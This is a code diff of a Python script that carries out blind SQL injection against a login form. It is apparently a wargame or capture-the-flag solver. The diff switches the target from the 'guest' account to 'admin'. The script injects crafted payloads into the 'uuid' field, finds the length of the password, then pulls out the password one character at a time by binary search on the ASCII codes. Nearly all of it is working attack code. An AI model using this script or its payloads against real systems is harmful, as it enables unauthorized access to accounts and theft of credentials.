@@ -10,12 +10,14 @@ datas = {
 
 def get_password_length():
     for i in range(30,50):
-        injection_string = "' or length(pw) = {} and id='guest' -- ".format(str(i))
+        injection_string = "' or length(pw) = {} and id='admin' -- ".format(str(i))
         datas['uuid'] = injection_string
         response = requests.post(url,data=datas)
         if('Wrong password' in response.text):
-            print("find password length")
+            print("find password length : "+ str(i))
             return i
+
+password_length = get_password_length()
 
 def get_password(password_length):
     password = ''
@@ -24,7 +26,7 @@ def get_password(password_length):
         while(1):
             search = int((left + right)/2)
             #print(search)
-            injection_string = "' or id='guest' and ascii(substr(pw,{},1)) < {}--  ".format(i,search)
+            injection_string = "' or id='admin' and ascii(substr(pw,{},1)) < {}--  ".format(i,search)
             datas['uuid'] = injection_string
             response = requests.post(url,data=datas)
             response.text
@@ -39,7 +41,7 @@ def get_password(password_length):
                 password += chr(left)
                 break
             if(left == (right -1)):
-                injection_string = "' or id='guest' and ascii(substr(pw,{},1)) = {}--  ".format(i,left)
+                injection_string = "' or id='admin' and ascii(substr(pw,{},1)) = {}--  ".format(i,left)
                 datas['uuid'] = injection_string
                 response = requests.post(url,data=datas)
                 if('Login Fail!' in response.text):
@@ -50,17 +52,9 @@ def get_password(password_length):
                     print(chr(left))
                     password +=chr(left)
                     break
+    print("find the password : " + str(password))
     return password
 
+password = get_password(password_length)
+print("result : {}".format(password))
 
-def main():
-    password_length = get_password_length()
-    password = get_password(password_length)
-    print("result : {}".format(password))
-
-
-if __name__ == '__main__':
-    main()
-
-
-print(get_password_length())
